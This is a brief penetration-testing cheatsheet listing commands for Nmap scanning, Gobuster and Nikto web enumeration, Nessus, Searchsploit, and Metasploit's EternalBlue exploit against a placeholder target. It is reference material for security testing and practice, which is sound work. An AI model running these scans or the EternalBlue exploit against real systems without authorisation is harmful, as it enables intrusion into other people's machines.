Penetration Testing Cheatsheet

Connecting Using OpenVPN

sudo openvpn --config <your-config-file>.ovpn

Network Scanning

Nmap

  • Ping Scan (Live Hosts): 
    nmap -sn <IP-Range>
  • Full Port Scan: 
    nmap -p 1-65535 <IP-Address>
  • Service Version Detection: 
    nmap -sV <IP-Address>
  • Script Scanning: 
    nmap -sC -sV -oN nmap_initial <IP-Address>

Web Enumeration

Gobuster

  • Directory Brute-Forcing: 
    gobuster dir -u http://<IP-Address> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_results.txt

Nikto

  • Web Server Scanner: 
    nikto -h http://<IP-Address>

Vulnerability Scanning

Nessus

  • Running a Scan: 
    nessus -q -x -i <scan.xml>

Exploitation

Metasploit

  • Starting Metasploit: 
    msfconsole
  • EternalBlue Example: 
    use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP-Address>
run

Searchsploit

  • Search for Exploits: 
    searchsploit <software name/version>
